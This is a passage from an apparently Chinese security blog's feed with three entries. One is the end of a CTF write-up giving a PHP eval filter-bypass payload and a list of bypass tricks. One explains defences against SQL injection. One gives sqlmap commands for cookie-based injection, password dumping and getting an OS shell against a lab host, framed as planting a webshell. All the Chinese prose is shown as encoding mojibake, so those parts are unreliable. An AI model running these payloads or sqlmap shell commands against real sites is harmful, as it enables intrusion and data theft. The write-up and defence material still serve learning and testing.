class="string">'/`|"|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is'</span>, $_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Not allowed keyword'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">eval</span>($_GET[<span class="string">'flag'</span>]) === sha1($flag)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'What\'s going on?'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä¸»è¦åˆ©ç”¨çš„æ˜¯ifæ¡ä»¶é‡Œé¢çš„evalå‡½æ•°ç›´æ¥è¾“å‡ºflag,å‰ææ˜¯è¿™é‡Œè¿‡æ»¤ååˆ†å¼ºå¤§ï¼ŒæŠŠæ‰€æœ‰å¯ä»¥æ‰§è¡Œçš„å‡½æ•°å…¨éƒ¨è¿‡æ»¤ï¼Œè¿™æ—¶å€™åªèƒ½åˆ©ç”¨å¼€å‘çš„ä¸€ä¸ªçŸ¥è¯†ï¼Œå°±æ˜¯<code>&lt;?=$flag?&gt;</code>,å¯ä»¥ç›´æ¥æŠŠflagé‡Œé¢çš„å†…å®¹ç›´æ¥è¾“å‡ºæ¥ï¼Œè¿™ä¸œè¥¿æˆ‘ä¹Ÿæ˜¯åœ¨å­¦YIIæ¡†æ¶çš„æ—¶å€™å­¦ä¼šçš„ã€‚<br>å¯ä»¥ç›´æ¥çœ‹ä¸€ä¸‹æ–‡æ¡£é‡Œé¢æœ‰è¿™æ ·çš„ä¸€å¥è¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= expression ?&gt; This is a shortcut for &quot;&lt;? echo expression ?&gt;&quot;</span><br></pre></td></tr></table></figure><p>è¿™ç›¸å½“äºè¯´è¿™æ˜¯ä¸€ä¸ªechoçš„ç¼©å†™ç‰ˆ<br><a href="https://imgchr.com/i/P2tbjg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P2tbjg.md.png" alt="P2tbjg.md.png"></a><br>å¦å¤–å‘¢è¿™ä¸¤å¥è¯è¡¨æ˜äº†php5.4ä»¥åéƒ½å­˜åœ¨è¿™æ ·çš„ç¼©å†™å½¢å¼<br>æˆ‘ä»¬ç°åœ¨è¿˜è¦è€ƒè™‘çš„æ˜¯å¦‚ä½•ç»•è¿‡é•¿åº¦çš„é—®é¢˜ä»¥åŠä¸è¦åœ¨payloadé‡Œé¢å­˜åœ¨flagè¿™ä¸ªè¯ï¼Œæ‰€ä»¥æœ€åçš„payloadæ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=$a=&apos;blag&apos;;$a&#123;0&#125;=&apos;f&apos;;?&gt;11111111111111111;&lt;?=$$a;?&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå‰é¢çš„<code>?&gt;</code>çš„æ˜¯åˆ©ç”¨äº†htmlé‡Œé¢çš„åµŒå¥—PHPçš„è¯­æ³•ï¼ŒåŒæ—¶ä¹Ÿä¸ºäº†åé¢çš„<code>&lt;?=?&gt;</code>å¯ä»¥é¡ºåˆ©æ‰§è¡Œï¼Œä¸­é—´çš„<code>1</code>å°±æ˜¯ä¸ºäº†æ»¡è¶³<code>strlen</code>è¿™ä¸ªå‡½æ•°ä»è€Œæ‰§è¡Œä¸‹é¢çš„ä»£ç </p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>1.IPåœ°å€å¯ä»¥ç”¨ip2longè¿™ä¸ªå‡½æ•°å°è¯•å»ç»•è¿‡<br>2.å›é¡¾äº†ç§‘å­¦è®¡æ•°æ³•è¿˜æœ‰è¿™ä¸ªæŒ‡æ•°å½¢å¼åœ¨bypassæ–¹é¢çš„ç»•è¿‡<br>3.parse_url()è¿™ä¸ªå‡½æ•°çš„å‡ ä¸ªå°trickï¼Œåˆ†åˆ«æ˜¯å¯¹äºç‰¹æ®Šå­—ç¬¦ä¼šæ›¿æ¢æˆ_,ä»¥åŠåœ¨///çš„æƒ…å†µä¸‹ä¼šä½¿åé¢çš„ä¸œè¥¿å¿½ç•¥ä»è€Œå¯¼è‡´ç»•è¿‡<br>4.å…³äºæ³¨å…¥è¿™ä¸œè¥¿ï¼Œçµæ´»ä¸€äº›ï¼Œåˆ«å¤ªæ­»æ¿ï¼Œé™¤äº†ä¸€äº›ç‰¹æ®Šçš„æ–¹æ³•ç»•è¿‡ä»¥å¤–ï¼Œè¿˜å¯ä»¥è€ƒè™‘å­—ç¬¦é›†(è¿™é‡ŒåŒ…æ‹¬16è¿›åˆ¶)<br>5.evalå‡½æ•°é‡Œé¢çš„æ‰§è¡Œæ–‡ä»¶æ“ä½œçš„å‡½æ•°éƒ½è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨ç¼©å†™è¾“å‡ºä¹‹ç±»<br>6.æ­£åˆ™åŒ¹é…æ³¨æ„ä¸€ä¸‹åŒ¹é…\çš„å†™æ³•åº”è¯¥æ˜¯å››ä¸ª|\\|,è€Œä¸”å¯¹äºæ­£åˆ™çš„è§„åˆ™ä»¥^å¼€å¤´$ç»“å°¾çš„ï¼Œå¯ä»¥%0aå»bypass<br>7.è¿˜æœ‰é£˜é›¶å¤§å“¥çš„æ€è·¯ï¼Œä»£ç å®¡è®¡æ‹¿æ¥å¯èƒ½æ˜¯SQLæ³¨å…¥è¿˜æœ‰é€»è¾‘æ¼æ´è¿™ä¹Ÿæ˜¯å¾ˆéªšæ°”çš„ï¼Œ22333</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æµ…è°ˆSQLæ³¨å…¥é˜²å¾¡æ‰‹æ®µ</title>
      <link href="/sql-inject-protect.html"/>
      <url>/sql-inject-protect.html</url>
      <content type="html"><![CDATA[<h3 id="sqlè¯­å¥é¢„ç¼–è¯‘"><a href="#sqlè¯­å¥é¢„ç¼–è¯‘" class="headerlink" title="sqlè¯­å¥é¢„ç¼–è¯‘"></a>sqlè¯­å¥é¢„ç¼–è¯‘</h3><p>ä¾‹å¦‚:<a id="more"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String sql = <span class="string">"select id, no from user where id=?"</span>;</span><br><span class="line">      PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line">      ps.setInt(<span class="number">1</span>, id);</span><br><span class="line">      ps.executeQuery();</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé‡‡ç”¨äº†<code>PreparedStatement</code>ï¼Œå°±ä¼šå°†sqlè¯­å¥<code>é¢„å…ˆç¼–è¯‘</code>å¥½ï¼Œä¹Ÿå°±æ˜¯SQLå¼•æ“ä¼šé¢„å…ˆè¿›è¡Œè¯­æ³•åˆ†æï¼Œäº§ç”Ÿè¯­æ³•æ ‘ï¼Œç”Ÿæˆæ‰§è¡Œè®¡åˆ’ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåé¢ä½ è¾“å…¥çš„å‚æ•°ï¼Œæ— è®ºä½ è¾“å…¥çš„æ˜¯ä»€ä¹ˆï¼Œéƒ½ä¸ä¼šå½±å“è¯¥sqlè¯­å¥çš„ è¯­æ³•ç»“æ„äº†ï¼Œå› ä¸ºè¯­æ³•åˆ†æå·²ç»å®Œæˆäº†ï¼Œè€Œè¯­æ³•åˆ†æä¸»è¦æ˜¯åˆ†æsqlå‘½ä»¤ï¼Œæ¯”å¦‚ <code>select ,from ,where ,and, or ,order by</code> ç­‰ç­‰ã€‚æ‰€ä»¥å³ä½¿ä½ åé¢è¾“å…¥äº†è¿™äº›sqlå‘½ä»¤ï¼Œä¹Ÿä¸ä¼šè¢«å½“æˆsqlå‘½ä»¤æ¥æ‰§è¡Œäº†ï¼Œå› ä¸ºè¿™äº›sqlå‘½ä»¤çš„æ‰§è¡Œï¼Œ å¿…é¡»å…ˆçš„é€šè¿‡è¯­æ³•åˆ†æï¼Œç”Ÿæˆæ‰§è¡Œè®¡åˆ’ï¼Œæ—¢ç„¶è¯­æ³•åˆ†æå·²ç»å®Œæˆï¼Œå·²ç»é¢„ç¼–è¯‘è¿‡äº†ï¼Œé‚£ä¹ˆåé¢è¾“å…¥çš„å‚æ•°ï¼Œæ˜¯ç»å¯¹ä¸å¯èƒ½ä½œä¸ºsqlå‘½ä»¤æ¥æ‰§è¡Œçš„ï¼Œåªä¼šè¢«å½“åšå­—ç¬¦ä¸²å­—é¢å€¼å‚æ•°ã€‚æ‰€ä»¥sqlè¯­å¥é¢„ç¼–è¯‘å¯ä»¥é˜²å¾¡sqlæ³¨å…¥</p><p>è®²ä¸€ä¸‹å¦å¤–ä¸€ä¸ªé¢„ç¼–è¯‘ï¼Œå°±æ˜¯ç”¨PDOï¼Œè¿™é‡Œå°±æ¨èå‡ ç¯‡æ–‡ç« è‡ªå·±çœ‹ä¸€ä¸‹ï¼Œç®€å•è¯´ä¸€ä¸‹å°±æ˜¯åŸç†è·Ÿä¸Šé¢çš„å·®ä¸å¤šï¼ŒæŠŠæ‰§è¡Œè¯­å¥å’Œå˜é‡åˆ†å¼€ï¼Œå˜é‡åˆ†åˆ«ç»‘å®šï¼Œåˆ†åˆ«ä¼ å‚ï¼Œä»è€Œé˜»æ­¢äº†æ³¨å…¥ï¼Œåªæ˜¯åº•å±‚ä¸å¤ªæ˜äº†ï¼Œè‡ªå·±çœŸèœã€‚ã€‚<br><a href="https://segmentfault.com/q/1010000000723496" target="_blank" rel="noopener">https://segmentfault.com/q/1010000000723496</a><br><a href="http://www.cnblogs.com/zl0372/p/php_28.html" target="_blank" rel="noopener">http://www.cnblogs.com/zl0372/p/php_28.html</a><br><a href="https://blog.csdn.net/theVicTory/article/details/62884352" target="_blank" rel="noopener">https://blog.csdn.net/theVicTory/article/details/62884352</a></p><p>é¢„ç¼–è¯‘æ–¹æ³•å°±æœ€æœ‰æ•ˆï¼ï¼ä¹Ÿæ˜¯å¦‚ä»Šå¸‚åœºä¸Šæœ€æµè¡Œçš„æ–¹å¼äº†</p><h3 id="æ£€æŸ¥å˜é‡æ•°æ®ç±»å‹å’Œæ ¼å¼"><a href="#æ£€æŸ¥å˜é‡æ•°æ®ç±»å‹å’Œæ ¼å¼" class="headerlink" title="æ£€æŸ¥å˜é‡æ•°æ®ç±»å‹å’Œæ ¼å¼"></a>æ£€æŸ¥å˜é‡æ•°æ®ç±»å‹å’Œæ ¼å¼</h3><p>ä¾‹å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uid=checkuid($uid);    <span class="comment">//æ£€æµ‹$uidæ˜¯ä¸æ˜¯æ•°å­—ç±»å‹,ä¸æ˜¯ä¸ç»§ç»­å¾€ä¸‹è¿è¡Œ</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT uid,username FROM user WHERE uid='&#123;$uid&#125;â€˜;</span></span><br></pre></td></tr></table></figure><p>è¿™æ®µè¯­å¥æ˜¯ä¸ºäº†ä¿è¯äº†idæ˜¯æ•°å­—ç±»å‹ï¼Œcheckidæ˜¯ä¸€ä¸ª<code>è‡ªå®šä¹‰</code>çš„å‡½æ•°ï¼Œä½†æ˜¯åƒä¸‡åˆ«ç›´æ¥é‡Œé¢å†™ä¸€ä¸ª<code>is_numeric</code>å°±ç»“æŸäº†å•Šï¼Œè¿™å¾ˆå®¹æ˜“å°±å¯ä»¥ç”¨16è¿›åˆ¶æˆ–è€…æ˜¯ç§‘å­¦è®¡æ•°æ³•å»ç»•è¿‡çš„ï¼Œè¿™ä¸ªè¿˜æ˜¯å°‘ç”¨å§ï¼Œæ¯•ç«Ÿè‡ªå†™å‡½æ•°å°±åƒæ˜¯å†™é»‘åå•ï¼Œè‚¯å®šä¼šæœ‰çº°æ¼çš„</p><h3 id="è¿‡æ»¤ç‰¹æ®Šå­—ç¬¦"><a href="#è¿‡æ»¤ç‰¹æ®Šå­—ç¬¦" class="headerlink" title="è¿‡æ»¤ç‰¹æ®Šå­—ç¬¦"></a>è¿‡æ»¤ç‰¹æ®Šå­—ç¬¦</h3><p>è¿™ä¸ªæ–¹æ³•ä¹Ÿç›¸å½“äº<code>é»‘åå•</code>ï¼Œè¿˜æ˜¯å°‘ç”¨ä¸ºå¥½ï¼Œä¸€èˆ¬æœ‰çº°æ¼å°±å¯ä»¥å»ç»•è¿‡çš„äº†</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> boolean sql_inj(String str) </span><br><span class="line">&#123; </span><br><span class="line">String inj_str = â€œâ€™|<span class="keyword">and</span>|exec|insert|select|delete|update| </span><br><span class="line">count|*|%|chr|mid|master|truncate|char|<span class="keyword">declare</span>|;|<span class="keyword">or</span>|-|+|,â€; </span><br><span class="line">String inj_stra[] = split(inj_str,â€|â€); </span><br><span class="line"><span class="keyword">for</span> (int i=<span class="number">0</span> ; i &lt; inj_stra.length ; i++ ) </span><br><span class="line">&#123; <span class="keyword">if</span> (str.indexOf(inj_stra[i])&gt;=<span class="number">0</span>) &#123; <span class="keyword">return</span> <span class="keyword">true</span>; &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é»‘åå•åªèƒ½è¿½æ±‚å…¨é¢å»é¿å…SQLæ³¨å…¥äº†</p><h3 id="è½¬è¯‘ç‰¹æ®Šç¬¦å·"><a href="#è½¬è¯‘ç‰¹æ®Šç¬¦å·" class="headerlink" title="è½¬è¯‘ç‰¹æ®Šç¬¦å·"></a>è½¬è¯‘ç‰¹æ®Šç¬¦å·</h3><p>ä¾‹å¦‚:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uid = <span class="keyword">isset</span>($_GET[<span class="string">'uid'</span>]) ? $_GET[<span class="string">'uid'</span>] : <span class="number">0</span>;</span><br><span class="line">$uid = addslashes(uid);</span><br><span class="line">$sql = <span class="string">"SELECT uid,username FROM user WHERE uid='&#123;$uid&#125;'"</span>;</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œå°±æ˜¯åˆ©ç”¨äº†<code>addslashes</code>å‡½æ•°å»å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œæ¯”å¦‚å•å¼•å·ä¼šè¢«è½¬è¯‘æˆ<code>\â€™</code>ï¼Œæ‰€ä»¥æ— æ³•é—­åˆå’Œæ³¨é‡Šã€‚ä¸èƒ½è¾¾åˆ°sqlæ³¨å…¥æ”»å‡»çš„æ•ˆæœã€‚ä¸€èˆ¬åœ¨CTFé¢˜ç›®é‡Œé¢å¦‚æœæˆ‘çœ‹åˆ°è¿™ä¸ªå‡½æ•°çš„è¯ï¼Œæˆ‘ä¼šé¢„æµ‹æœ‰75%å¯èƒ½ä¸æ˜¯SQLæ³¨å…¥ï¼Œå…ˆå»çœ‹çœ‹å…¶ä»–ç‚¹æ˜¯å¦å­˜åœ¨æ¼æ´</p><h3 id="ä»ä¸­é—´ä»¶é…ç½®ä¸Šé˜²æ­¢SQLæ³¨å…¥"><a href="#ä»ä¸­é—´ä»¶é…ç½®ä¸Šé˜²æ­¢SQLæ³¨å…¥" class="headerlink" title="ä»ä¸­é—´ä»¶é…ç½®ä¸Šé˜²æ­¢SQLæ³¨å…¥"></a>ä»ä¸­é—´ä»¶é…ç½®ä¸Šé˜²æ­¢SQLæ³¨å…¥</h3><p>é€šè¿‡å¯ç”¨php.inié…ç½®æ–‡ä»¶ä¸­çš„<code>magic_quote_gpc (é­”æœ¯å­—ç¬¦)</code>ï¼Œå°±å¯ä»¥å°†å¤§éƒ¨åˆ†æƒ³åˆ©ç”¨SQLæ³¨å…¥æ¼æ´çš„éª‡å®¢æ‹’ç»äºé—¨å¤–ã€‚å¼€å¯<code>magic_quote_gpc=on</code>ä¹‹åï¼Œèƒ½å®ç°<code>addslshes()</code>å’Œ<code>stripslashes()</code>è¿™ä¸¤ä¸ªå‡½æ•°çš„åŠŸèƒ½ï¼Œè¿™å°±ä»å¾ˆå¤§ç¨‹åº¦ä¸Šé˜²æ­¢äº†sqlæ³¨å…¥ã€‚<code>PHP 5.4</code> ä¹‹å‰ PHP æŒ‡ä»¤ <code>magic_quotes_gpc</code> é»˜è®¤æ˜¯ <code>on</code>ï¼Œ å®é™…ä¸Šæ‰€æœ‰çš„ GETã€POST å’Œ COOKIE æ•°æ®éƒ½ç”¨è¢« <code>addslashes()</code> äº†ã€‚ ä¸è¦å¯¹å·²ç»è¢« <code>magic_quotes_gpc</code> è½¬ä¹‰è¿‡çš„å­—ç¬¦ä¸²ä½¿ç”¨ <code>addslashes()</code>ï¼Œå› ä¸ºè¿™æ ·ä¼šå¯¼è‡´<code>åŒå±‚è½¬ä¹‰</code>ã€‚ é‡åˆ°è¿™ç§æƒ…å†µæ—¶å¯ä»¥ä½¿ç”¨å‡½æ•° get_magic_quotes_gpc() è¿›è¡Œæ£€æµ‹<br>ä½†æ˜¯åªå¼€å¯<code>magic_quote_gpc</code> ï¼Œå¯¹é˜²æ­¢sqlæ³¨å…¥æ˜¯è¿œè¿œä¸å¤Ÿçš„ã€‚<br>ä¾‹å¦‚ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uid = <span class="keyword">isset</span>($_GET[<span class="string">'uid'</span>]) ? $_GET[<span class="string">'uid'</span>] : <span class="number">0</span>;</span><br><span class="line">$uid = addslashes(uid);</span><br><span class="line">$sql = <span class="string">"SELECT uid,username FROM user WHERE uid=&#123;$uid&#125;"</span>;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™æ¡sqlè¯­å¥ä¸­å¹¶æ²¡æœ‰å•å¼•å·çš„ä¿æŠ¤ï¼Œæ”»å‡»è€…æ—¢ä¸éœ€è¦é—­åˆå•å¼•å·ä¹Ÿä¸éœ€è¦æ³¨é‡Šå•å¼•å·ï¼Œæ‰€ä»¥gpcå¼€å¯å¯¹sqlæ³¨å…¥æ”»å‡»çš„é˜²èŒƒå¹¶æ²¡æœ‰ä½œç”¨ã€‚æ‰€ä»¥è¯´å˜é‡è¿˜æ˜¯è¦ç”¨å¼•å·åŒ…ä½æ‰å¥½ï¼Œåˆ«ç›´æ¥å°±èµ‹å€¼äº†ã€‚ã€‚ã€‚</p><h3 id="é€šè¿‡å®‰å…¨wafå»é˜²å¾¡"><a href="#é€šè¿‡å®‰å…¨wafå»é˜²å¾¡" class="headerlink" title="é€šè¿‡å®‰å…¨wafå»é˜²å¾¡"></a>é€šè¿‡å®‰å…¨wafå»é˜²å¾¡</h3><p>è¿‡å®‰å…¨wafè¾¾åˆ°ä¸€å®šç¨‹åº¦é˜²å¾¡,è½¯ä»¶å±‚é¢çš„ä¸å¤šè¯´ã€‚</p><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>æ€»çš„æ¥è¯´ï¼Œç°åœ¨å¾ˆå¤šç½‘ç«™å¤šä¸ä¼šå†ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥å»æŸ¥æ‰¾æ•°æ®åº“é‡Œé¢çš„å†…å®¹äº†ï¼Œå¤§å¤šæ•°ç°åœ¨ä½¿ç”¨çš„æ˜¯é¢„ç¼–è¯‘ï¼Œé™¤äº†é‚£äº›è’åºŸçš„ç½‘ç«™ä»¥åŠCTFé¢˜ç›®é‡Œé¢ä¼šä½¿ç”¨ï¼Œé‚£æ˜¯ä¸æ˜¯è¯´ä»¥åæŒ–æ´æŒ–SQLæ³¨å…¥çš„å°±æ¯”è¾ƒéš¾äº†233333ã€‚ã€‚ã€‚æˆ‘è¿˜æ˜¯å¤ªå¹´è½»äº†</p>]]></content>
      
      <categories>
          
          <category> SQLæ³¨å…¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Sqlmap ä½¿ç”¨æ–¹æ³•å°ç»“</title>
      <link href="/sqlmap-usage.html"/>
      <url>/sqlmap-usage.html</url>
      <content type="html"><![CDATA[<p>å¹³å¸¸çš„ä½¿ç”¨GETæ–¹æ³•åƒâ€“tables â€“columns -T -D â€“dbs â€“dump å•¥çš„å°±ä¸è¯´äº†ï¼Œåªæ˜¯åšå®¢å‡ å¤©ä¸å‘ï¼Œç©ºç€ä¸å¥½ï¼Œè¿˜æ˜¯å¾—å†™å†™ä¸œè¥¿<a id="more"></a></p><p>å‰ç½®çŸ¥è¯†<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">--is-dba å½“å‰ç”¨æˆ·æƒé™ï¼ˆæ˜¯å¦ä¸ºrootæƒé™ï¼Œmssqlä¸‹æœ€é«˜æƒé™ä¸ºsaï¼‰</span><br><span class="line">--dbs æ‰€æœ‰æ•°æ®åº“</span><br><span class="line">--current-db ç½‘ç«™å½“å‰æ•°æ®åº“</span><br><span class="line">--users æ‰€æœ‰æ•°æ®åº“ç”¨æˆ·</span><br><span class="line">--current-user å½“å‰æ•°æ®åº“ç”¨æˆ·</span><br><span class="line">--random-agent æ„é€ éšæœºuser-agent</span><br><span class="line">--passwords æ•°æ®åº“å¯†ç </span><br><span class="line">--proxy http://local:8080 â€“threads 10 (å¯ä»¥è‡ªå®šä¹‰çº¿ç¨‹åŠ é€Ÿ) ä»£ç†</span><br><span class="line">--time-sec=TIMESEC DBMSå“åº”çš„å»¶è¿Ÿæ—¶é—´ï¼ˆé»˜è®¤ä¸º5ç§’</span><br><span class="line">--threads=                       ä½¿ç”¨å¤šå°‘çº¿ç¨‹</span><br></pre></td></tr></table></figure></p><p><code>--is-dba</code> è¿™ä¸ªå‘½ä»¤æœ‰æ—¶å€™å†³å®šäº†ä½ æ˜¯å¦å¯ä»¥åœ¨æœåŠ¡å™¨ä¸‹è¿›è¡Œå†™çš„æ“ä½œï¼Œè¿™ä¸ªå¾ˆé‡è¦ï¼Œæ˜¯å¦æœ‰å†™çš„æƒé™ï¼Œä»£è¡¨ä½ æ˜¯å¦å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šé¢å†™å…¥ä¸€å¥è¯æœ¨é©¬</p><h3 id="åˆ©ç”¨sqlmapè¿›è¡ŒPOSTæ³¨å…¥"><a href="#åˆ©ç”¨sqlmapè¿›è¡ŒPOSTæ³¨å…¥" class="headerlink" title="åˆ©ç”¨sqlmapè¿›è¡ŒPOSTæ³¨å…¥"></a>åˆ©ç”¨sqlmapè¿›è¡ŒPOSTæ³¨å…¥</h3><p>å…ˆåˆ©ç”¨bpå»æŠ“ä¸€ä¸ªåŒ…ï¼Œç›´æ¥å‘é€åŒ…é‡Œé¢çš„å†…å®¹ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œé¢ï¼Œç„¶åç”¨<code>-r</code>å‚æ•°å»å®ç°å®ƒå°±å¥½<br>ä¾‹å¦‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r â€œc:\tools\request.txtâ€ -p â€œusernameâ€ â€“dbms mysql</span><br><span class="line">```    </span><br><span class="line">æŒ‡å®šusernameå‚æ•°ï¼Œ-dbmsæŒ‡å®šäº†æŸç§æ•°æ®åº“ï¼Œè¿™å¥è¯æŒ‡å®šçš„æ˜¯mysqlæ•°æ®åº“ï¼Œ-pæŒ‡å®šçš„æ˜¯å‚æ•°ï¼Œä¸æŒ‡å®šçš„è¯æ¯ä¸€ä¸ªå‚æ•°ä»–éƒ½ä¼šå°è¯•</span><br><span class="line">æ³¨æ„è¿™å¥è¯å·²ç»ä¸åƒå¹³å¸¸é‚£æ ·éœ€è¦`-u`å‚æ•°äº†ï¼Œç›´æ¥`-r`å‚æ•°å³å¯ï¼Œå› ä¸ºæŠ¥æ–‡é‡Œé¢å·²ç»å«æœ‰äº†å«æœ‰åº”æœ‰çš„å„ç§æ¡ä»¶</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### åˆ©ç”¨sqlmapè¿›è¡Œéœ€è¦ç™»é™†çš„æ³¨å…¥</span><br><span class="line">å¯ä»¥è·Ÿä¸Šé¢è¿›è¡Œpostæ³¨å…¥çš„ä¸€æ ·ï¼Œç›´æ¥`-r`å‚æ•°å¸¦ä¸Šä½ çš„æŠ“åŒ…æ–‡ä»¶è·¯å¾„ï¼Œæ—¢ç„¶æ˜¯éœ€è¦ç™»å½•çš„æ³¨å…¥ï¼Œé‚£ä¹ˆæŠ¥æ–‡é‡Œé¢è‚¯å®šæ˜¯è¦æœ‰`cookie`çš„</span><br><span class="line">æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨<span class="comment">--cookieå‚æ•°æ³¨å…¥ï¼Œä¾‹å¦‚: </span></span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp; Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --current-db</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢çš„cookieå‚æ•°å¯ä»¥æŠ“åŒ…è·å¾—</p><h3 id="åˆ©ç”¨sqlmapè¿›è¡Œäº¤äº’å¼å†™shell"><a href="#åˆ©ç”¨sqlmapè¿›è¡Œäº¤äº’å¼å†™shell" class="headerlink" title="åˆ©ç”¨sqlmapè¿›è¡Œäº¤äº’å¼å†™shell"></a>åˆ©ç”¨sqlmapè¿›è¡Œäº¤äº’å¼å†™shell</h3><p>è¿™ä¸ªè¦åˆ©ç”¨sqlmapå†™shellçš„è¯å‰æéœ€è¦è·å–ç½‘ç«™çš„ç»å¯¹è·¯å¾„ï¼Œè€Œä¸”å¿…é¡»å™æ˜¯rootæƒé™</p><p>ä½¿ç”¨burpsuiteè¿›è¡ŒæŠ“åŒ…ï¼Œè·å–cookieã€‚åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ä¸ºdbaï¼Œè¾“å…¥å‘½ä»¤ï¼š<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --is-dba</span></span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/08/02/P0g9pT.png" alt="P0g9pT.png"></p><p>  è¾“å…¥å‘½ä»¤ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --os-shell</span></span><br></pre></td></tr></table></figure><p>  è„šæœ¬ç±»å‹ä¸ºPHPï¼Œæ‰€ä»¥è¾“å…¥4<br><img src="https://s1.ax1x.com/2018/08/02/P0gC1U.png" alt="P0gC1U.png">     </p><p>   è¾“å…¥ç¬¬äºŒæ­¥å¾—åˆ°çš„è·¯å¾„ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨é‡Œé¢å†™ç›¸å…³å‘½ä»¤äº†<br><img src="https://s1.ax1x.com/2018/08/02/P0gknJ.png" alt="P0gknJ.png"></p><p><img src="https://s1.ax1x.com/2018/08/02/P0gu9K.png" 